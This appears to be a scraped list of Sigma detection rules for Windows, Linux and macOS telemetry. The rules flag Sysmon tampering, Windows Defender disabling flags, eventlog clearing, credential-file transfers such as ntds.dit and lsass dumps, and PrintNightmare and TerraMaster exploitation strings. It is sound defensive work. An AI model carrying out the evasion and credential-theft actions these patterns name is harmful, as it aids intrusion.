<li><a href="#">title:Sysmon Configuration Modification id: 1f2b5353-573f-4880-8e33-7d04dcf97744 description: Someone try to hide from Sysmon status: experimental author: frack113 date: 2021/06/04 modified: 2021/09/07 references: - - tags: - attack.defense_evasion - attack.t1564 logsource: product: windows category: sysmon_status detection: selection_stop: State: Stopped selection_conf: - 'Sysmon config state changed' condition: selection_stop or selection_conf falsepositives: - Legitimate administrative action level: high 
<li><a href="#">title:Sysmon Crash id: 4d7f1827-1637-4def-8d8a-fd254f9454df status: experimental description: Detectes application popup reporting a failure of the Sysmon service author: Tim Shelton date: 2022/04/26 logsource: product: windows service: system detection: selection: Provider_Name: 'Application Popup' EventID: 26 Caption: 'sysmon64.exe - Application Error' condition: selection falsepositives: - Unknown level: high tags: - attack.t1562 - attack.impair_defenses 
<li><a href="#">title:Sysmon Driver Unload id: 4d7cda18-1b12-4e52-b45c-d28653210df8 status: experimental author: Kirill Kiryanov, oscd.community description: Detect possible Sysmon driver unload date: 2019/10/23 modified: 2021/09/27 references: - logsource: product: windows category: process_creation tags: - attack.defense_evasion - attack.t1070 - attack.t1562 - attack.t1562.002 detection: selection: Image|endswith: '\fltmc.exe' CommandLine|contains|all: - 'unload' - 'sys' condition: selection falsepositives: - Unknown level: high fields: - CommandLine - Details 
<li><a href="#">title:Sysmon Process Hollowing Detection id: c4b890e5-8d8c-4496-8c66-c805753817cd status: experimental description: Detects when a memory process image does not match the disk image, indicative of process hollowing. author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Sittikorn S date: 2022/01/25 modified: 2022/02/01 references: - - tags: - attack.process_injection - attack.t1055.012 logsource: product: windows category: process_tampering detection: selection: Type: Image is replaced filters: Image|contains: - ':\Program Files\' - ':\Program Files (x86)' Image|endswith: - '\chrome.exe' - '\opera.exe' - '\firefox.exe' - '\MicrosoftEdge.exe' condition: selection and not filters falsepositives: - There are no known false positives at this time level: high 
<li><a href="#">title:Sysprep on AppData Folder id: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e status: test description: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec) author: Florian Roth references: - - date: 2018/06/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\sysprep.exe' CommandLine|contains: '\AppData\' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:System Eventlog Cleared id: 100ef69e-3327-481c-8e5c-6d80d9507556 related: - id: a62b37e0-45d3-48d9-a517-90c1a1b0186b type: derived description: One of the Windows Core Eventlogs has been cleared. e.g. caused by "wevtutil cl" command execution status: experimental references: - - author: Florian Roth, Tim Shelton date: 2022/05/17 modified: 2022/05/19 tags: - attack.defense_evasion - attack.t1070.001 - car.2016-04-002 logsource: product: windows service: system detection: selection: EventID: 104 Provider_Name: Microsoft-Windows-Eventlog Channel: - "System" - "Security" - "Application" condition: selection falsepositives: - Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog) - System provisioning (system reset before the golden image creation) level: high 
<li><a href="#">title:System File Execution Location Anomaly id: e5a6b256-3e47-40fc-89d2-7a477edd6915 status: experimental description: Detects a Windows program executable started in a suspicious folder references: - author: Florian Roth, Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali date: 2017/11/27 modified: 2022/07/03 tags: - attack.defense_evasion - attack.t1036 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\svchost.exe' - '\rundll32.exe' - '\services.exe' - '\powershell.exe' - '\powershell_ise.exe' - '\regsvr32.exe' - '\spoolsv.exe' - '\lsass.exe' - '\smss.exe' - '\csrss.exe' - '\conhost.exe' - '\wininit.exe' - '\lsm.exe' - '\winlogon.exe' - '\explorer.exe' - '\taskhost.exe' - '\Taskmgr.exe' - '\sihost.exe' - '\RuntimeBroker.exe' - '\smartscreen.exe' - '\dllhost.exe' - '\audiodg.exe' - '\wlanext.exe' - '\dashost.exe' - '\schtasks.exe' - '\cscript.exe' - '\wscript.exe' - '\wsl.exe' - '\bitsadmin.exe' - '\atbroker.exe' - '\bcdedit.exe' - '\certutil.exe' - '\certreq.exe' - '\cmstp.exe' - '\consent.exe' - '\defrag.exe' - '\dism.exe' - '\dllhst3g.exe' - '\eventvwr.exe' - '\msiexec.exe' - '\runonce.exe' - '\winver.exe' - '\logonui.exe' - '\userinit.exe' - '\dwm.exe' - '\LsaIso.exe' - '\ntoskrnl.exe' filter: - Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' - 'C:\Windows\WinSxS\' - 'C:\avast! sandbox' - Image|contains: '\SystemRoot\System32\' - Image: 'C:\Windows\explorer.exe' condition: selection and not filter fields: - ComputerName - User - Image falsepositives: - Exotic software level: high 
<li><a href="#">title:System Information Discovery id: 1f358e2e-cb63-43c3-b575-dfb072a6814f related: - id: 42df45e7-e6e9-43b5-8f26-bec5b39cc239 type: derived status: stable description: Detects system information discovery commands author: Ã–mer GÃ¼nal, oscd.community date: 2020/10/08 modified: 2021/09/14 references: - tags: - attack.discovery - attack.t1082 logsource: product: linux service: auditd detection: selection: type: 'PATH' name: - '/sys/class/dmi/id/bios_version' - '/sys/class/dmi/id/product_name' - '/sys/class/dmi/id/chassis_vendor' - '/proc/scsi/scsi' - '/proc/ide/hd0/model' - '/proc/version' - '/etc/*version' - '/etc/*release' - '/etc/issue' condition: selection falsepositives: - Legitimate administration activities level: informational 
<li><a href="#">title:System Information Discovery id: 42df45e7-e6e9-43b5-8f26-bec5b39cc239 status: stable description: Detects system information discovery commands author: Ã–mer GÃ¼nal, oscd.community date: 2020/10/08 modified: 2021/09/14 references: - tags: - attack.discovery - attack.t1082 logsource: product: linux category: process_creation detection: selection: Image|endswith: - '/uname' - '/hostname' - '/uptime' - '/lspci' - '/dmidecode' - '/lscpu' - '/lsmod' condition: selection falsepositives: - Legitimate administration activities level: informational 
<li><a href="#">title:System Information Discovery id: f34047d9-20d3-4e8b-8672-0a35cc50dc71 description: Detects System Information Discovery commands author: 'Pawel Mazur' status: experimental date: 2021/09/03 references: - - logsource: product: linux service: auditd detection: selection: type: PATH name: - /etc/lsb-release - /etc/redhat-release - /etc/issue selection2: type: EXECVE a0: - uname - uptime condition: selection or selection2 tags: - attack.discovery - attack.t1082 falsepositives: - Legitimate administrative activity level: low 
<li><a href="#">title:System Network Connections Discovery id: 4c519226-f0cd-4471-bd2f-6fbb2bb68a79 status: test description: Detects usage of system utilities to discover system network connections author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection: Image|endswith: - '/who' - '/w' - '/last' - '/lsof' - '/netstat' condition: selection falsepositives: - Legitimate activities level: low tags: - attack.discovery - attack.t1049 
<li><a href="#">title:System Network Connections Discovery id: 9a7a0393-2144-4626-9bf1-7c2f5a7321db status: test description: Detects usage of system utilities to discover system network connections author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image: - '/usr/bin/who' - '/usr/bin/w' - '/usr/bin/last' - '/usr/sbin/lsof' - '/usr/sbin/netstat' condition: selection falsepositives: - Legitimate activities level: informational tags: - attack.discovery - attack.t1049 
<li><a href="#">title:System Network Discovery - Linux id: e7bd1cfa-b446-4c88-8afb-403bcd79e3fa status: test description: Detects enumeration of local network configuration author: Ã–mer GÃ¼nal and remotephone, oscd.community references: - date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection1: Image|endswith: - '/firewall-cmd' - '/ufw' - '/iptables' - '/netstat' - '/ss' - '/ip' - '/ifconfig' - '/systemd-resolve' - '/route' selection2: CommandLine|contains: '/etc/resolv.conf' condition: selection1 or selection2 falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1016 
<li><a href="#">title:System Network Discovery - macOS id: 58800443-f9fc-4d55-ae0c-98a3966dfb97 status: test description: Detects enumeration of local network configuration author: remotephone, oscd.community references: - date: 2020/10/06 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image: - '/usr/sbin/netstat' - '/sbin/ifconfig' - '/usr/sbin/ipconfig' - '/usr/libexec/ApplicationFirewall/socketfilterfw' - '/usr/sbin/networksetup' - '/usr/sbin/arp' selection2: Image: '/usr/bin/defaults' CommandLine|contains|all: - 'read' - '/Library/Preferences/com.apple.alf' condition: selection1 or selection2 falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1016 
<li><a href="#">title:System Owner or User Discovery id: 9a0d8ca0-2385-4020-b6c6-cb6153ca56f3 status: test description: Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'EXECVE' a0: - 'users' - 'w' - 'who' condition: selection falsepositives: - Admin activity level: low tags: - attack.discovery - attack.t1033 
<li><a href="#">title:System Scripts Autorun Keys Modification id: e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: scripts_base: EventType: SetValue TargetObject|contains: '\Software\Policies\Microsoft\Windows\System\Scripts' scripts: TargetObject|contains: - '\Startup' - '\Shutdown' - '\Logon' - '\Logoff' filter: Details: '(Empty)' condition: scripts_base and scripts and not filter fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:'System Shutdown/Reboot' id: 40b1fbe2-18ea-4ee7-be47-0294285811de status: test description: 'Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.' author: 'Igor Fits, Mikhail Larin, oscd.community' references: - hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: Image|endswith: - '/shutdown' - '/reboot' - '/halt' condition: selection falsepositives: - Legitimate administrative activity level: informational tags: - attack.impact - attack.t1529 
<li><a href="#">title:'System Shutdown/Reboot' id: 4cb57c2f-1f29-41f8-893d-8bed8e1c1d2f status: test description: 'Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.' author: 'Igor Fits, oscd.community' references: - hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: 'EXECVE' shutdowncmd: - 'shutdown' - 'reboot' - 'halt' - 'poweroff' init: - 'init' - 'telinit' initselection: - '0' - '6' condition: execve and (shutdowncmd or (init and initselection)) falsepositives: - Legitimate administrative activity level: informational tags: - attack.impact - attack.t1529 
<li><a href="#">title:Systemd Service Creation id: 1bac86ba-41aa-4f62-9d6b-405eac99b485 status: experimental description: Detects a creation of systemd services which could be used by adversaries to execute malicious code. author: 'Pawel Mazur' references: - - date: 2022/02/03 modified: 2022/02/06 logsource: product: linux service: auditd detection: path: type: 'PATH' nametype: 'CREATE' name_1: name|startswith: - '/usr/lib/systemd/system/' - '/etc/systemd/system/' name_2: name|contains: '/.config/systemd/user/' condition: path and 1 of name_* falsepositives: - Admin work like legit service installs. level: medium tags: - attack.persistence - attack.t1543.002 
<li><a href="#">title:Systemd Service Reload or Start id: 2625cc59-0634-40d0-821e-cb67382a3dd7 status: test description: Detects a reload or a start of a service. author: Jakob Weinzettl, oscd.community references: - - date: 2019/09/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'EXECVE' a0|contains: 'systemctl' a1|contains: - 'daemon-reload' - 'start' condition: selection falsepositives: - Installation of legitimate service. - Legitimate reconfiguration of service. level: low tags: - attack.persistence - attack.t1543.002 
<li><a href="#">title:SystemNightmare Exploitation Script Execution id: c01f7bd6-0c1d-47aa-9c61-187b91273a16 status: test description: Detects the exploitation of PrinterNightmare to get a shell as LOCAL_SYSTEM references: - author: Florian Roth date: 2021/08/11 tags: - attack.privilege_escalation - attack.t1068 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'printnightmare.gentilkiwi.com' - ' /user:gentilguest ' - 'Kiwi Legit Printer' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack id: c39f0c81-7348-4965-ab27-2fde35a1b641 status: test description: Detects a threat actor creating a file named `iertutil.dll` in the `C:\Program Files\Internet Explorer\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario. author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) references: - date: 2020/10/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 RelativeTargetName|endswith: '\Internet Explorer\iertutil.dll' filter: SubjectUserName|endswith: '$' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 - attack.t1021.003 
<li><a href="#">title:T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack id: e554f142-5cf3-4e55-ace9-a1b59e0def65 description: Detects a threat actor creating a file named `iertutil.dll` in the `C:\Program Files\Internet Explorer\` directory over the network and loading it for a DCOM InternetExplorer DLL Hijack scenario. status: experimental date: 2020/10/12 modified: 2021/06/27 author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR), wagga tags: - attack.lateral_movement - attack.t1021.002 - attack.t1021.003 references: - logsource: product: windows service: sysmon detection: selection_one: EventID: 11 Image: System TargetFilename|endswith: '\Internet Explorer\iertutil.dll' selection_two: EventID: 7 Image|endswith: '\Internet Explorer\iexplore.exe' ImageLoaded|endswith: '\Internet Explorer\iertutil.dll' condition: selection_one or selection_two falsepositives: - Unknown level: critical 
<li><a href="#">title:T1047 Wmiprvse Wbemcomn DLL Hijack id: f6c68d5f-e101-4b86-8c84-7d96851fd65c status: test description: Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\Windows\System32\wbem\` directory over the network for a WMI DLL Hijack scenario. author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) references: - date: 2020/10/12 modified: 2022/02/24 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 5145 RelativeTargetName|endswith: '\wbem\wbemcomn.dll' filter: SubjectUserName|endswith: '$' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:T1086 PowerShell Execution id: ac7102b4-9e1e-4802-9b4f-17c5524c015c status: test description: Detects execution of PowerShell author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - date: 2019/09/12 modified: 2021/11/27 logsource: product: windows category: pipe_created detection: selection: PipeName|startswith: '\PSHost' condition: selection falsepositives: - Unknown level: informational tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:TA505 Dropper Load Pattern id: 18cf6cf0-39b0-4c22-9593-e244bdc9a2d4 status: test description: Detects mshta loaded by wmiprvse as parent as used by TA505 malicious documents author: Florian Roth references: - date: 2020/12/08 modified: 2022/03/31 logsource: category: process_creation product: windows detection: selection_parent: ParentImage|endswith: '\wmiprvse.exe' selection_mshta: - Image|endswith: '\mshta.exe' - OriginalFileName: 'mshta.exe' condition: selection_parent and selection_mshta falsepositives: - Unknown level: critical tags: - attack.execution - attack.g0092 - attack.t1106 
<li><a href="#">title:TAIDOOR RAT DLL Load id: d1aa3382-abab-446f-96ea-4de52908210b status: test description: Detects specific process characteristics of Chinese TAIDOOR RAT malware load author: Florian Roth references: - date: 2020/07/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'dll,MyStart' - 'dll MyStart' selection2a: CommandLine|endswith: ' MyStart' selection2b: CommandLine|contains: 'rundll32.exe' condition: selection1 or ( selection2a and selection2b ) falsepositives: - Unknown level: high tags: - attack.execution - attack.t1055.001 
<li><a href="#">title:Tamper Windows Defender id: ec19ebab-72dc-40e1-9728-4c0b805d722c description: Attempting to disable scheduled scanning and other parts of windows defender atp. status: experimental tags: - attack.defense_evasion - attack.t1562.001 references: - author: frack113 date: 2021/06/07 modified: 2021/10/16 falsepositives: - Unknown level: high logsource: product: windows category: ps_classic_provider_start definition: fields have to be extract from event detection: tamper_ps_action: HostApplication|contains: 'Set-MpPreference' tamper_ps_option: HostApplication|contains: - '-DisableRealtimeMonitoring 1' - '-DisableBehaviorMonitoring 1' - '-DisableScriptScanning 1' - '-DisableBlockAtFirstSeen 1' condition: tamper_ps_action and tamper_ps_option 
<li><a href="#">title:Tap Driver Installation id: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9 description: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques status: experimental author: Daniil Yugoslavskiy, Ian Davis, oscd.community date: 2019/10/24 modified: 2021/11/30 tags: - attack.exfiltration - attack.t1048 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains: 'tap0901' condition: selection falsepositives: - Legitimate OpenVPN TAP insntallation level: medium 
<li><a href="#">title:Tap Driver Installation id: 9c8afa4d-0022-48f0-9456-3712466f9701 related: - id: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9 type: derived description: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques status: experimental author: Daniil Yugoslavskiy, Ian Davis, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains: 'tap0901' condition: selection falsepositives: - Legitimate OpenVPN TAP insntallation level: medium 
<li><a href="#">title:Tap Installer Execution id: 99793437-3e16-439b-be0f-078782cf953d status: test description: Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques author: Daniil Yugoslavskiy, Ian Davis, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\tapinstall.exe' condition: selection falsepositives: - Legitimate OpenVPN TAP insntallation level: medium tags: - attack.exfiltration - attack.t1048 
<li><a href="#">title:Taskmgr as LOCAL_SYSTEM id: 9fff585c-c33e-4a86-b3cd-39312079a65f status: experimental description: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM tags: - attack.defense_evasion - attack.t1036 author: Florian Roth date: 2018/03/18 modified: 2022/05/27 logsource: category: process_creation product: windows detection: selection: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' Image|endswith: '\taskmgr.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Taskmgr as Parent id: 3d7679bd-0c00-440c-97b0-3f204273e6c7 status: test description: Detects the creation of a process from Windows task manager author: Florian Roth date: 2018/03/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\taskmgr.exe' filter: Image|endswith: - '\resmon.exe' - '\mmc.exe' - '\taskmgr.exe' condition: selection and not filter fields: - Image - CommandLine - ParentCommandLine falsepositives: - Administrative activity level: low tags: - attack.defense_evasion - attack.t1036 
<li><a href="#">title:Tasks Folder Evasion id: cc4e02ba-9c06-48e2-b09e-2500cace9ae0 status: experimental description: The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr references: - - date: 2020/01/13 modified: 2021/11/06 author: Sreeman tags: - attack.defense_evasion - attack.persistence - attack.execution - attack.t1574.002 logsource: product: windows category: process_creation detection: selection1: CommandLine|contains: - 'echo ' - 'copy ' - 'type ' - 'file createnew' selection2: CommandLine|contains: - ' C:\Windows\System32\Tasks\' - ' C:\Windows\SysWow64\Tasks\' condition: selection1 and selection2 fields: - CommandLine - ParentProcess falsepositives: - Unknown level: high 
<li><a href="#">title:TeamViewer Remote Session id: 162ab1e4-6874-4564-853c-53ec3ab8be01 status: experimental description: Detects the creation of log files during a TeamViewer remote session references: - author: Florian Roth date: 2022/01/30 tags: - attack.command_and_control - attack.t1219 logsource: product: windows category: file_event detection: selection1: TargetFilename|endswith: - '\TeamViewer\RemotePrinting\tvprint.db' - '\TeamViewer\TVNetwork.log' selection2: TargetFilename|contains|all: - '\TeamViewer' - '_Logfile.log' condition: 1 of selection* falsepositives: - Legitimate uses of TeamViewer in an organisation level: medium 
<li><a href="#">title:Telegram API Access id: b494b165-6634-483d-8c47-2026a6c52372 status: test description: Detects suspicious requests to Telegram API without the usual Telegram User-Agent author: Florian Roth references: - - - date: 2018/06/05 modified: 2021/11/27 logsource: category: proxy detection: selection: r-dns: 'api.telegram.org' # Often used by Bots filter: c-useragent|contains: # Used for this list - 'Telegram' - 'Bot' condition: selection and not filter fields: - ClientIP - c-uri - c-useragent falsepositives: - Legitimate use of Telegram bots in the company level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 - attack.t1102.002 
<li><a href="#">title:Telegram Bot API Request id: c64c5175-5189-431b-a55e-6d9882158251 status: experimental description: Detects suspicious DNS queries to api.telegram.org used by Telegram Bots of any kind author: Florian Roth date: 2018/06/05 modified: 2021/08/09 references: - - - - logsource: category: dns detection: selection: query: 'api.telegram.org' # Telegram Bot API Request condition: selection falsepositives: - Legitimate use of Telegram bots in the company level: medium tags: - attack.command_and_control - attack.t1102.002 
<li><a href="#">title:Terminal Server Client Connection History Cleared id: 07bdd2f5-9c58-4f38-aec8-e101bb79ef8d description: Detects the deletion of registry keys containing the MSTSC connection history references: - - tags: - attack.defense_evasion - attack.t1070 - attack.t1112 author: Christian Burkard status: experimental date: 2021/10/19 modified: 2022/03/26 logsource: category: registry_delete product: windows detection: selection1: EventType: DeleteValue TargetObject|contains: '\Microsoft\Terminal Server Client\Default\MRU' selection2: EventType: DeleteKey TargetObject|contains: '\Microsoft\Terminal Server Client\Servers\' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Terminal Service Process Spawn id: 1012f107-b8f1-4271-af30-5aed2de89b39 status: test description: Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708) author: Florian Roth references: - date: 2019/05/22 modified: 2022/06/24 logsource: product: windows category: process_creation detection: selection: ParentCommandLine|contains|all: - '\svchost.exe' - 'termsvcs' filter: Image|endswith: - '\rdpclip.exe' - ':\Windows\System32\csrss.exe' - ':\Windows\System32\wininit.exe' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - attack.lateral_movement - attack.t1210 - car.2013-07-002 
<li><a href="#">title:TerraMaster TOS CVE-2020-28188 id: 15c312b9-00d0-4feb-8870-7d940a4bdc5e status: experimental description: Detects the exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188 author: Bhabesh Raj date: 2021/01/25 references: - - logsource: category: webserver detection: base_url: cs-method: 'GET' c-uri|contains|all: - '/include/makecvs.php' - '?Event=' payload: c-uri|contains: - 'curl' - 'wget' - '.py' - '.sh' - 'chmod' - '_GET' condition: base_url and payload fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020.28188 
<li><a href="#">title:Testing Usage of Uncommonly Used Port id: adf876b3-f1f8-4aa9-a4e4-a64106feec06 status: experimental description: | Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. references: - - author: frack113 date: 2022/01/23 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - Test-NetConnection - '-ComputerName ' - '-port ' filter: ScriptBlockText|contains: - ' 443 ' - ' 80 ' condition: selection and not filter falsepositives: - Legitimate administrative script level: medium tags: - attack.command_and_control - attack.t1571 
<li><a href="#">title:Time Travel Debugging Utility Usage id: 0b4ae027-2a2d-4b93-8c7e-962caaba5b2a status: experimental related: - id: e76c8240-d68f-4773-8880-5c6f63595aaf type: derived description: Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe. references: - - - author: 'Ensar Åžamil, @sblmsrsn, @oscd_initiative' date: 2020/10/06 modified: 2021/09/21 tags: - attack.defense_evasion - attack.credential_access - attack.t1218 - attack.t1003.001 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: '\tttracer.exe' condition: selection falsepositives: - Legitimate usage by software developers/testers level: high 
<li><a href="#">title:Time Travel Debugging Utility Usage id: e76c8240-d68f-4773-8880-5c6f63595aaf status: experimental description: Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe. references: - - - author: 'Ensar Åžamil, @sblmsrsn, @oscd_initiative' date: 2020/10/06 modified: 2021/09/21 tags: - attack.defense_evasion - attack.credential_access - attack.t1218 - attack.t1003.001 logsource: product: windows category: image_load detection: selection: ImageLoaded|endswith: - '\ttdrecord.dll' - '\ttdwriter.dll' - '\ttdloader.dll' condition: selection falsepositives: - Legitimate usage by software developers/testers level: high 
<li><a href="#">title:Too Long PowerShell Commandlines id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6 description: Detects Too long PowerShell command lines references: - tags: - attack.execution - attack.t1059.001 status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/12/02 logsource: category: process_creation product: windows detection: selection_powershell: - CommandLine|contains: - 'powershell' - 'pwsh' - Description: 'Windows Powershell' - Product: 'PowerShell Core 6' selection_length: CommandLine|re: '.{1000,}' condition: all of selection* falsepositives: - Unknown level: low 
<li><a href="#">title:Tor Client or Tor Browser Use id: 62f7c9bf-9135-49b2-8aeb-1e54a6ecc13c status: experimental description: Detects the use of Tor or Tor-Browser to connect to onion routing networks references: - author: frack113 date: 2022/02/20 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\tor.exe' - '\Tor Browser\Browser\firefox.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1090.003 
<li><a href="#">title:Transferring Files with Credential Data via Network Shares - Zeek id: 2e69f167-47b5-4ae7-a390-47764529eff5 status: test description: Transferring files with well-known filenames (sensitive files with credential data) using network shares author: '@neu5ron, Teymur Kheirkhabarov, oscd.community' references: - date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: name: - '\mimidrv' - '\lsass' - '\windows\minidump\' - '\hiberfil' - '\sqldmpr' - '\sam' - '\ntds.dit' - '\security' condition: selection falsepositives: - Transferring sensitive files for legitimate administration work by legitimate administrator level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.001 - attack.t1003.003 
<li><a href="#">title:Transferring Files with Credential Data via Network Shares id: 910ab938-668b-401b-b08c-b596e80fdca5 status: test description: Transferring files with well-known filenames (sensitive files with credential data) using network shares author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/10/22 modified: 2021/11/30 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 5145 RelativeTargetName|contains: - '\mimidrv' - '\lsass' - '\windows\minidump\' - '\hiberfil' - '\sqldmpr' - '\sam' - '\ntds.dit' - '\security' condition: selection falsepositives: - Transferring sensitive files for legitimate administration work by legitimate administrator level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.001 - attack.t1003.003 
<li><a href="#">title:Trickbot Malware Activity id: 58bf96d9-ff5f-44bd-8dcc-1c4f79bf3a27 status: stable description: Detects Trickbot malware process tree pattern in which rundll32.exe is parent of wermgr.exe author: Florian Roth references: - - date: 2020/11/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\wermgr.exe' ParentImage|endswith: '\rundll32.exe' ParentCommandLine|contains: 'DllRegisterServer' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1559 
<li><a href="#">title:Trickbot Malware Recon Activity id: 410ad193-a728-4107-bc79-4419789fcbf8 status: test description: Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes. This detectors attempts to identify that activity based off a command rarely observed in an enterprise network. author: David Burkett, Florian Roth references: - - date: 2019/12/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\cmd.exe' Image|endswith: '\nltest.exe' CommandLine|contains: '/domain_trusts /all_trusts' condition: selection falsepositives: - Rare System Admin Activity level: critical tags: - attack.discovery - attack.t1482 
<li><a href="#">title:TropicTrooper Campaign November 2018 id: 8c7090c3-e0a0-4944-bd08-08c3a0cecf79 author: '@41thexplorer, Microsoft Defender ATP' status: stable date: 2019/11/12 modified: 2020/08/27 description: Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia references: - tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc' condition: selection level: high 
